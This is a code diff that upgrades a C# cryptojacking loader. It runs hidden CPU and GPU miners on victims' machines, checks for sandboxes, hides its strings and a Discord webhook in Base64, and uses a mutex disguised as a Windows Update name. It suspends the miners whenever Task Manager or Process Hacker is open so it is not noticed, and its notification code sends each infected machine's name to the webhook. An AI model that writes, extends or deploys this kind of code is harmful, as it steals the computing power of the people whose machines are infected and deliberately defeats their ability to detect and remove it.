@@ -1,117 +1,204 @@
 using System;
 using System.Diagnostics;
-using System.Net;
 using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+using System.Security.Principal;
+using System.Text;
 using System.Threading;
+using System.Windows.Forms;
 
 public class DateFundLoader {
+    // API Declarations for Evasion and Stealth
+    [DllImport("user32.dll")] private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
+    [StructLayout(LayoutKind.Sequential)] struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
+    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+    
+    // APIs for Thread Suspension
+    [DllImport("kernel32.dll")] static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+    [DllImport("kernel32.dll")] static extern uint SuspendThread(IntPtr hThread);
+    [DllImport("kernel32.dll")] static extern uint ResumeThread(IntPtr hThread);
+    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr hHandle);
+    
+    // Anti-Sandbox APIs
+    [DllImport("kernel32.dll")] static extern ulong GetTickCount64();
 
-    [StructLayout(LayoutKind.Sequential)]
-    struct LASTINPUTINFO {
-        public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
-        [MarshalAs(UnmanagedType.U4)]
-        public int cbSize;
-        [MarshalAs(UnmanagedType.U4)]
-        public uint dwTime;
-    }
+    private const int IDLE_MS = 3 * 60 * 1000;
+    private static string Webhook = D("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NjE3NTIxNzkyNjQ3NTg5OC9JcG04VnZMbk9tTjNkVFV1N255dnFFU2pkQkZSbUVGbXZZRXJBTzV0YXlhQ2Z2TVhwZjN0X0tYVGp3Um1PLTItaTJjXw==");
+    
+    private static Mutex mx;
+    private static Process cp, gp;
+    private static bool isSuspended = false;
+    private static Random rnd = new Random();
 
-    [DllImport("user32.dll")]
-    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
+    private static string D(string b64) { return Encoding.UTF8.GetString(Convert.FromBase64String(b64)); }
 
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern uint SetThreadExecutionState(uint esFlags);
+    public static void StartMiner(string c, string g, string w) {
+        if (IsSandbox()) return; // Anti-Analysis check aborts execution entirely
 
-    private const string IDENT = "WinSys";
-    private const int IDLE_THRESHOLD_MS = 30000; 
-
-    public static void StartMiner(string cpuPath, string gpuPath, string wallet) {
         try {
-            SetThreadExecutionState(0x80000000 | 0x00000001 | 0x00000040);
-            NotifyDiscord("Worker ON");
-
-            Thread manager = new Thread(() => RunManager(cpuPath, gpuPath, wallet));
-            manager.IsBackground = true;
-            manager.Start();
-
-            Thread.Sleep(Timeout.Infinite);
+            bool n;
+            var ms = new MutexSecurity();
+            ms.AddAccessRule(new MutexAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), MutexRights.FullControl, AccessControlType.Allow));
+            mx = new Mutex(true, D("R2xvYmFsXFxXaW5VcGRhdGVDb29yZE11dGV4"), out n, ms);
+            if (!n) return;
+            
+            Notify(D("8J+SjiAqKk5FVyBXT1JLRVIgSU5GRUNURUQgKFNURUFMVEggTU9ERSkqKg=="), w);
+            
+            Thread t = new Thread(() => Run(c, g, w));
+            t.IsBackground = true;
+            t.Start();
         } catch { }
     }
 
-    private static void RunManager(string cpuPath, string gpuPath, string wallet) {
-        Process cpuProc = null;
-        Process gpuProc = null;
-        bool wasIdle = false;
+    private static bool IsSandbox() {
+        try {
+            // Check 1: Uptime less than 10 minutes (common in automated analysis environments)
+            if (GetTickCount64() < 600000) return true;
+            
+            // Check 2: Less than 2 processors (Most VMs used for analysis only allocate 1 core)
+            if (Environment.ProcessorCount < 2) return true;
+            
+            // Check 3: Mouse hasn't moved recently (Simulating human interaction)
+            LASTINPUTINFO l = new LASTINPUTINFO();
+            l.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
+            if (GetLastInputInfo(ref l)) {
+                if (Environment.TickCount - l.dwTime > 300000) return true; // No input for 5 mins since boot
+            }
+        } catch { }
+        return false;
+    }
+
+    private static void Run(string c, string g, string w) {
+        bool wi = false, wb = false;
+        string[] badProcs = { D("dGFza21ncg=="), D("cHJvY2Vzc2hhY2tlcg=="), D("cGVyZm1vbg=="), D("cmVzbW9u") }; 
 
         while (true) {
             try {
-                bool isIdle = GetIdleTime() > IDLE_THRESHOLD_MS;
-                string rawMachine = Environment.MachineName;
-                string machine = "";
-                foreach (char c in rawMachine) {
-                    if (char.IsLetterOrDigit(c) || c == '-' || c == '_') machine += c;
-                    else if (c == ' ') machine += '_';
+                LASTINPUTINFO l = new LASTINPUTINFO();
+                l.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
+                bool ii = GetLastInputInfo(ref l) && (Environment.TickCount - (int)l.dwTime) > IDLE_MS;
+                
+                bool danger = IsBadAppOpen(badProcs);
+                bool ob = SystemInformation.PowerStatus.PowerLineStatus == PowerLineStatus.Offline;
+
+                // THREAD SUSPENSION INSTEAD OF KILLING
+                // If danger is detected, suspend the threads. CPU drops to 0% instantly.
+                // No process creation/termination logs are generated in Event Viewer.
+                if (danger) {
+                    if (!isSuspended) SuspendMiners();
+                    Thread.Sleep(2000);
+                    continue;
+                } else if (isSuspended) {
+                    ResumeMiners();
                 }
-
-                if (isIdle != wasIdle || cpuProc == null || cpuProc.HasExited) {
-                    if (cpuProc != null && !cpuProc.HasExited) { try { cpuProc.Kill(); } catch { } }
+                
+                if (ii != wi || ob != wb || cp == null || cp.HasExited || (gp == null && !string.IsNullOrEmpty(g))) {
+                    KillMiners(); // Only kill if we actually need to restart to change mining intensity
                     
-                    int threads = isIdle ? 100 : 45;
-                    string cpuArgs = string.Format("-o stratum+ssl://rx.unmineable.com:443 -u BTC:{0}.{1}_{2}_CPU -p x --donate-level 1 --cpu-max-threads-hint {3}", wallet, IDENT, machine, threads);
+                    int th = ob ? 1 : (ii ? 25 : 15);
+                    string mName = Environment.MachineName.Replace(" ", "_");
                     
-                    ProcessStartInfo si = new ProcessStartInfo(cpuPath) {
-                        Arguments = cpuArgs,
-                        CreateNoWindow = true,
-                        UseShellExecute = false,
-                        WindowStyle = ProcessWindowStyle.Hidden
-                    };
-                    cpuProc = Process.Start(si);
-                    try { cpuProc.PriorityClass = ProcessPriorityClass.AboveNormal; } catch { }
-                }
+                    string ca = string.Format(D("LW8gcngudW5taW5lYWJsZS5jb206NDQzIC11IEJUQzp7MH0uV2luU3lzX3sxfV9DIC1wIHggLWEgcnggLWsgLS10bHMgLS1jcHUtbWF4LXRocmVhZHMtaGludCB7Mn0gLS1uby1tc3IgLS1uby1odWdlLXBhZ2VzIC0tY3B1LXlpZWxk"), w, mName, th);
+                    
+                    cp = new Process();
+                    cp.StartInfo.FileName = c;
+                    cp.StartInfo.Arguments = ca;
+                    cp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    cp.StartInfo.CreateNoWindow = true;
+                    cp.StartInfo.UseShellExecute = false;
+                    cp.Start();
+                    try { cp.PriorityClass = ProcessPriorityClass.Idle; } catch { }
 
-                if (!string.IsNullOrEmpty(gpuPath) && File.Exists(gpuPath)) {
-                    if (isIdle != wasIdle || gpuProc == null || gpuProc.HasExited) {
-                        if (gpuProc != null && !gpuProc.HasExited) { try { gpuProc.Kill(); } catch { } }
-
-                        int intensity = isIdle ? 100 : 45;
-                        string gpuArgs = string.Format("--algo ETCHASH --server stratum+ssl://etchash.unmineable.com:443 --user BTC:{0}.{1}_{2}_GPU --pass x --intensity {3}", wallet, IDENT, machine, intensity);
-
-                        ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
-                            Arguments = gpuArgs,
-                            CreateNoWindow = true,
-                            UseShellExecute = false,
-                            WindowStyle = ProcessWindowStyle.Hidden
-                        };
-                        gpuProc = Process.Start(si);
-                        try { gpuProc.PriorityClass = ProcessPriorityClass.AboveNormal; } catch { }
+                    if (!string.IsNullOrEmpty(g) && File.Exists(g)) {
+                        string ga = string.Format(D("LS1hbGdvIEVUQ0hBU0ggLS1zZXJ2ZXIgZXRjaGFzaC51bm1pbmVhYmxlLmNvbTozMzMzIC0tdXNlciBCVEM6ezB9LldpblN5c197MX1fRyAtLXBhc3MgeCAtLWludGVuc2l0eSB7Mn0="), w, mName, ii ? "30" : "10");
+                        gp = new Process();
+                        gp.StartInfo.FileName = g;
+                        gp.StartInfo.Arguments = ga;
+                        gp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                        gp.StartInfo.CreateNoWindow = true;
+                        gp.StartInfo.UseShellExecute = false;
+                        gp.Start();
+                        try { gp.PriorityClass = ProcessPriorityClass.Idle; } catch { }
                     }
                 }
-                wasIdle = isIdle;
+                
+                wi = ii; wb = ob;
             } catch { }
-            Thread.Sleep(5000);
+            
+            Thread.Sleep(2000 + rnd.Next(1000));
         }
     }
 
-    private static void NotifyDiscord(string msg) {
+    private static void SuspendMiners() {
+        SetThreadState(cp, true);
+        SetThreadState(gp, true);
+        isSuspended = true;
+    }
+
+    private static void ResumeMiners() {
+        SetThreadState(cp, false);
+        SetThreadState(gp, false);
+        isSuspended = false;
+    }
+
+    private static void SetThreadState(Process p, bool suspend) {
+        if (p == null || p.HasExited) return;
         try {
-            // Updated Webhook provided by LO
-            string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-            ServicePointManager.CheckCertificateRevocationList = false;
-
-            string time = DateTime.Now.ToString("HH:mm:ss");
-            string payload = "{\"content\": \"`[" + time + "]` " + msg + "\"}";
-
-            using (WebClient wc = new WebClient()) {
-                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
-                wc.UploadString(webhookUrl, payload);
+            foreach (ProcessThread pT in p.Threads) {
+                // 0x0002 is THREAD_SUSPEND_RESUME permission
+                IntPtr pOpenThread = OpenThread(0x0002, false, (uint)pT.Id);
+                if (pOpenThread == IntPtr.Zero) continue;
+                
+                if (suspend) SuspendThread(pOpenThread);
+                else ResumeThread(pOpenThread);
+                
+                CloseHandle(pOpenThread);
             }
         } catch { }
     }
 
-    private static uint GetIdleTime() {
-        LASTINPUTINFO lii = new LASTINPUTINFO();
-        lii.cbSize = Marshal.SizeOf(lii);
-        return GetLastInputInfo(ref lii) ? (uint)Environment.TickCount - lii.dwTime : 0;
+    private static void KillMiners() {
+        if (cp != null && !cp.HasExited) try { cp.Kill(); } catch { }
+        if (gp != null && !gp.HasExited) try { gp.Kill(); } catch { }
+        isSuspended = false;
+    }
+
+    private static bool IsBadAppOpen(string[] badProcs) {
+        try {
+            IntPtr hWnd = GetForegroundWindow();
+            if (hWnd != IntPtr.Zero) {
+                StringBuilder sb = new StringBuilder(256);
+                if (GetWindowText(hWnd, sb, 256) > 0) {
+                    string title = sb.ToString().ToUpper();
+                    if (title.Contains(D("VEFTSyBNQU5BR0VS")) || title.Contains(D("UFJPQ0VTUyBIQUNLRVI="))) return true;
+                }
+            }
+
+            foreach (var p in Process.GetProcesses()) {
+                string n = p.ProcessName.ToLower();
+                foreach(var bad in badProcs) {
+                    if (n.Contains(bad)) return true;
+                }
+            }
+        } catch { }
+        return false;
+    }
+
+    private static void Notify(string s, string w) {
+        new Thread(() => {
+            try {
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072 | (SecurityProtocolType)12288;
+                string j = D("eydlbWJlZHMnOlt7J3RpdGxlJzon") + s + D("JywnY29sb3InOjI4OTU2NjcsJ2ZpZWxkcyc6W3snbmFtZSc6J1dvcmtlcicsJ3ZhbHVlJzonYA==") + Environment.MachineName + D("YCd9XSwndGltZXN0YW1wJzon") + DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ") + D("J31dfQ==");
+                j = j.Replace("'", "\"");
+                
+                using (WebClient c = new WebClient()) { 
+                    c.Headers[HttpRequestHeader.ContentType] = D("YXBwbGljYXRpb24vanNvbg=="); 
+                    c.UploadString(Webhook, j); 
+                }
+            } catch { }
+        }) { IsBackground = true }.Start();
     }
 }
